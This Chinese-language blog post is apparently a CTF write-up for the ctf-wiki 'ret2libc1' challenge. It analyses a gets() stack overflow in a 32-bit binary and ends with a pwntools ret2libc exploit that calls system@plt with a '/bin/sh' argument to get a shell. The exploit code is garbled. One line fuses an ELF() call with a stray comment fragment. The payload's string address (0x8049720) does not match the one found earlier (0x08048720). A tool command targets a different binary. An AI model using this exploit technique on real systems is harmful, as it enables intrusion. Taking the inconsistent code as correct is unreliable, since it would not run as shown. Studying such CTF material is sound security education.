---
layout: post
title: CTF-PWN实例3（ret2libc1）
categories: 
 - CTF
 - PWN
 - 二进制
permalink: /pwn/3
nocomments: true  # Disable the comment box. This is EasyBook feature
typora-root-url: ..\_site
---

# CTF-PWN实例3（ret2libc1）

## 题目地址：

https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1

## 程序保护：

```shell
$ checksec ret2libc1
```

```shell
	Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

首先这里依旧开启了NX保护。

## 程序信息：

```shell
$file ret2libc1
ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, not stripped
```

这里跟上一题不一样，变成了动态链接。其实这一题和上一题链接状态都没什么作用，只是包含在程序本身的代码段少了，寻找对应的代码多少问题。

## 解题：

### 一、IDA分析程序溢出点

IDA分析main函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets((char *)&v4);
  return 0;
}
```

这里依旧是gets()函数造成溢出。但是这里我们可以在函数列表发现system函数。查看此函数的调用点。

```c
void secure()
{
  unsigned int v0; // eax@1
  int input; // [sp+18h] [bp-10h]@1
  int secretcode; // [sp+1Ch] [bp-Ch]@1

  v0 = time(0);
  srand(v0);
  secretcode = rand();
  __isoc99_scanf("%d", &input);
  if ( input == secretcode )
    system("shell!?");
}
```

发现sysrem函数中的参数不是我们所需要的。

### 二、cyclic和pwndbg判断偏移量

偏移量依然是112，就不做过多篇幅。

### 三、编写EXP

思路：

我们先试试上一题的思路。

```shell
$ROPgadget --binary ./rop --ropchain
```

返回的结果是失败的。

```python
[-] Can't find the 'mov dword ptr [r32], r32' gadget
```

找不到一定的代码段。

那前面已经发现可以利用的函数，这时候需要参数，其实这里就是上一题的分解步骤，这时候需要在程序中查找“/bin/sh”字符串，

```
$ROPgadget --binary ret2libc1 --string '/bin/sh'          
Strings information
============================================================
0x08048720 : /bin/sh
```

exp代码：

```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *

p = process('./ret2libc1')
elf = ELF('./ret2libc1')elf.plt['system']从plt表中搜索函数。
p.sendline('a'*112+p32(elf.plt['system'])+'aaaa'+p32(0x8049720)) #elf.plt['system']从plt表中搜索函数。

p.interactive()
```

这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'aaaa' 作为虚假的地址，其后参数对应的参数内容。

## 总结

这里跟上一题很相似但是是动态链接，但是这一题很简单，提供了system函数和对应的字符串。一般情况下不会这么简单。